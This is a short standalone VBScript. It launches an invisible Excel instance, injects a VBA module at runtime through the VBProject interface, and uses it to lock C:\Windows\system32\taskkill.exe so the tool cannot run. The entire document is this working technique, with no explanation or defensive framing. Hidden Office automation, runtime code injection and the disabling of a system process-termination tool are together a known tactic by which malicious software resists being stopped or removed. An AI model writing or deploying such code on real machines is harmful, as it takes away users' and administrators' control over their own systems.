Dim AppExcel 		: Set AppExcel=CreateObject("Excel.Application")
AppExcel.Visible = False
Dim AppExcelWBk 	: Set AppExcelWBk = AppExcel.Workbooks.Add
Dim AppExcelMod 	: Set AppExcelMod = AppExcelWBk.VBProject.VBComponents.Add(1)

AppExcelMod.CodeModule.AddFromString 	"Public Function LockFile(strFile)" & _
					VBCrLf & "TmpFile = FreeFile()" & VBCrLf & _
					"Open strFile For Binary Lock Read Write As #TmpFile" & _
					VBCrLf & "End Function"

AppExcel.Run "LockFile","C:\Windows\system32\taskkill.exe"
